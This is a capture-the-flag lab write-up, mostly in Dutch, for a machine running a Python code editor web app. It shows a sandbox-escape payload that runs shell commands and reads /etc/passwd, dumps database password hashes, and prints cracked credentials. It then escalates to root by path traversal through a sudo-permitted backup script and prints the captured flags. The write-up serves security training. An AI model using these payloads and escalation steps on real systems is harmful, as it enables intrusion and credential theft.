

# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap -p- 10.129.37.223
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 22:24 CET
Nmap scan report for 10.129.37.223
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 14.10 seconds
```
### Detailed port scan

At the gedatialized port scan go to get more information from the services dien are open the ip address.

```
nmap -p22,5000 -sCV 10.129.37.223 -vvvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 22:25 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:25
Completed NSE at 22:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:25
Completed NSE at 22:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:25
Completed NSE at 22:25, 0.00s elapsed
Initiating Ping Scan at 22:25
Scanning 10.129.37.223 [4 ports]
Completed Ping Scan at 22:25, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:25
Completed Parallel DNS resolution of 1 host. at 22:25, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:25
Scanning 10.129.37.223 [2 ports]
Discovered open port 22/tcp on 10.129.37.223
Discovered open port 5000/tcp on 10.129.37.223
Completed SYN Stealth Scan at 22:25, 0.07s elapsed (2 total ports)
Initiating Service scan at 22:25
Scanning 2 services on 10.129.37.223
Completed Service scan at 22:25, 6.31s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.37.223.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:25
Completed NSE at 22:25, 1.87s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:25
Completed NSE at 22:25, 0.41s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:25
Completed NSE at 22:25, 0.00s elapsed
Nmap scan report for 10.129.37.223
Host is up, received echo-reply ttl 63 (0.021s latency).
Scanned at 2025-03-24 22:25:24 CET for 9s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrE0z9yLzAZQKDE2qvJju5kq0jbbwNh6GfBrBu20em8SE/I4jT4FGig2hz6FHEYryAFBNCwJ0bYHr3hH9IQ7ZZNcpfYgQhi8C+QLGg+j7U4kw4rh3Z9wbQdm9tsFrUtbU92CuyZKpFsisrtc9e7271kyJElcycTWntcOk38otajZhHnLPZfqH90PM+ISA93hRpyGyrxj8phjTGlKC1O0zwvFDn8dqeaUreN7poWNIYxhJ0ppfFiCQf3rqxPS1fJ0YvKcUeNr2fb49H6Fba7FchR8OYlinjJLs1dFrx0jNNW/m3XS3l2+QTULGxM5cDrKip2XQxKfeTj4qKBCaFZUzknm27vHDW3gzct5W0lErXbnDWQcQZKjKTPu4Z/uExpJkk1rDfr3JXoMHaT4zaOV9l3s3KfrRSjOrXMJIrImtQN1l08nzh/Xg7KqnS1N46PEJ4ivVxEGFGaWrtC1MgjMZ6FtUSs/8RNDn59Pxt0HsSr6rgYkZC2LNwrgtMyiiwyas=
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiXZTkrXQPMXdU8ZTTQI45kkF2N38hyDVed+2fgp6nB3sR/mu/7K4yDqKQSDuvxiGe08r1b1STa/LZUjnFCfgg=
|   256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8Cwf2cBH9EDSARPML82QqjkV811d+Hsjrly11/PHfu
5000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:25
Completed NSE at 22:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:25
Completed NSE at 22:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:25
Completed NSE at 22:25, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

Nu ben ik dus naar de webpage geweest en heb ik gezien dat de webpage een Python 
Code Editor is. Ik ben dus gaan bekijken of dat ik dit niet kan gebruiken, of dat ik het "/etcc/passwd" path niet kan afprinten door het volgende commando te gaan gebruiken.

```
print(object.__subclasses__()[317]("cat /etc/passwd", shell=True, stdout=-1).communicate())print(object.__subclasses__()[317]("cat /etc/passwd", shell=True, stdout=-1).communicate())

(b'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nfwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\nusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:113:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\napp-production:x:1001:1001:,,,:/home/app-production:/bin/bash\nmartin:x:1000:1000:,,,:/home/martin:/bin/bash\n_laurel:x:997:997::/var/log/laurel:/bin/false\n', None)
```

Je kan hierboven de output zien van de code die dat ik zonet heb ingegeven. Nu zal ik gaan zien of er geen password hashes zijn die dat gedumped kunnen worden zodat ik deze dan met een john of een hashcat kan gaan decrypteren. Voor de password hashes te dumpen heb ik het volgende commando gebruikt.

```
print([(user.id, user.username, user.password) for user in User.query.all()])

[(1, 'development', '759b74ce43947f5f4c91aeddc3e5bad3'), (2, 'martin', '3de6f30c4a09c27fc71932bfc68474be')]
```

Zoals je hierboven zult kunnen zien zijn er 2 verschillende hashes gevonden, Ik zal voor het mijzelf gemakkelijk te maken en tijd te besparen zal ik de volgende hashes in crackstation gaan zetten. Ik zal hieronder de hashes zetten dat we zonet hebben gecracked.

| Username    | Password           |
| ----------- | ------------------ |
| development | development        |
| martin      | nafeelswordsmaster |
Ik zal nu een keer de usernames en de passworden gaan proberen testen voor binnen te geraken op de ssh server. Zoals je hieronder zult kunnen zien ben ik kunnen inloggen als de user martin op de ssh server.

```
ssh martin@10.129.37.223                                                        
The authenticity of host '10.129.37.223 (10.129.37.223)' can't be established.
ED25519 key fingerprint is SHA256:AlQsgTPYThQYa3z9ZAHkFiO/LqXA6T55FoT58A1zlAY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.37.223' (ED25519) to the list of known hosts.
martin@10.129.37.223's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 24 Mar 2025 04:15:46 PM UTC

  System load:           0.09
  Usage of /:            51.0% of 5.33GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             232
  Users logged in:       0
  IPv4 address for eth0: 10.129.37.223
  IPv6 address for eth0: dead:beef::250:56ff:fe94:626f


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Mar 24 16:15:47 2025 from 10.10.16.22
martin@code:~$ 
```

Ik ben eerst gaan kijken of dat er in de user martin een user.txt bestand was, maar dit was niet het geval. Binnen martin was er een ".tar.bz2" en een ".json" file. 

```
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  task.json
```

Ik ben dus als eerst het sudo -l commando gaan uitvoeren voor het zien of dat er niet iets is dat ik kan gaan misbruiken zonder de password van de root user nodig te moeten hebben. Je kan hieronder zien dat het backy.sh script gebruikt kan worden zonder root rechten.

```
martin@code:~/backups$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

Hieronder kan je zien dat het backy.sh script door de root user aan is gemaakt geweest.

```
martin@code:/usr/bin$ ls -l | grep "backy.sh"
-rwxr-xr-x 1 root   root        926 Sep 16  2024 backy.sh
```

Ik ben als eerst naar het task.json file gaan kijken.

```
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/app-production/app"
  ],
  "exclude": [
    ".*"
  ]
}

```

Hier ben ik gaan proberen of dat ik niet aan de hand van de code hieronder niet de user.txt.txt file zou kunnen kopieren naar de backups folder binnen de user martin. Dit ben ik gaan doen door een file in de tmp folder aan te gaan maken. Ik heb deze app-production.json genoemd.

```
{
 "destination":"/home/martin/backups/",
 "multiprocessing":true,
 "verbose_log":true,
 "directories_to_archive":[
  "/home/app-production/user.txt"
  ]
 }
```

Ik ben deze file dus nu gaan uitvoeren door het volgende commando te gaan gebruiken.

```
martin@code:/tmp$ sudo /usr/bin/backy.sh app-production.json 
/usr/bin/backy.sh: line 19: app-production.json: Permission denied
2025/03/24 17:08:24 🍀 backy 1.2
2025/03/24 17:08:24 📋 Working with app-production.json ...
2025/03/24 17:08:24 💤 Nothing to sync
2025/03/24 17:08:24 📤 Archiving: [/home/app-production/user.txt]
2025/03/24 17:08:24 📥 To: /home/martin/backups ...
2025/03/24 17:08:24 📦
tar: Removing leading `/' from member names
/home/app-production/user.txt
```

Als ik nu zal gaan kijken bij de user martin dan kan je zien dat er van de home folder een .tar.bz2 file is gemaak.

```
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  code_home_app-production_user.txt_2025_March.tar.bz2  task.jso
```

Ik ben deze folder dus nu gaan unzippen dit ben ik gaan doen door het volgende commando te gaan gebruiken. Daardoor kreeg ik dus nu een folder home van de user app-production, waar dat er het user.txt bestand in zat.

```
martin@code:~/backups$ tar -xvjf code_home_app-production_user.txt_2025_March.tar.bz2
home/app-production/user.txt
```

Nu ben ik dus naar de user.txt bestand gaan kijken voor de eerste flag.

user flag = 4934512aaf171ed9d67d4473fc357ecb

```
martin@code:~/backups/home/app-production$ cat user.txt 
4934512aaf171ed9d67d4473fc357ecb
```

Nu ben ik dus gaan proberen voor de root.txt file zou kunnen kopieren naar de backups folder binnen de user martin. Dit ben ik gaan doen door een file in de tmp folder aan te gaan maken. Ik heb deze root.json genoemd.

```
{
 "destination":"/home/martin/backups/",
 "multiprocessing":true,
 "verbose_log":true,
 "directories_to_archive":[
  "/var/../root/root.txt"
  ]
 }
```

Ik ben deze file dus nu gaan uitvoeren door het volgende commando te gaan gebruiken.

```
martin@code:/tmp$ sudo /usr/bin/backy.sh /tmp/rootme.json
/usr/bin/backy.sh: line 19: /tmp/rootme.json: Permission denied
2025/03/24 16:42:42 🍀 backy 1.2
2025/03/24 16:42:42 📋 Working with /tmp/rootme.json ...
2025/03/24 16:42:42 💤 Nothing to sync
2025/03/24 16:42:42 📤 Archiving: [/var/../root/root.txt]
2025/03/24 16:42:42 📥 To: /home/martin/backups ...
2025/03/24 16:42:42 📦
tar: Removing leading `/var/../' from member names
/var/../root/root.txt
```

Als ik nu zal gaan kijken bij de user martin dan kan je zien dat er van de root folder een .tar.bz2 file is gemaak.

```
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_root.txt_2025_March.tar.bz2
code_home_app-production_app_2025_March.tar.bz2   task.json
```

Ik ben deze folder dus nu gaan unzippen dit ben ik gaan doen door het volgende commando te gaan gebruiken. Daardoor kreeg ik dus nu een folder root, waar dat er het root.txt bestand in zat.

```
martin@code:~/backups$ tar -xvjf code_var_.._root_root.txt_2025_March.tar.bz2
root/root.txt
```

root.txt = 45e3a6cf9707e38495a4820c25d41d09

```
martin@code:~/backups/root$ cat root.txt 
45e3a6cf9707e38495a4820c25d41d09
```

ROOTED

![[Pasted image 20250324181822.png]]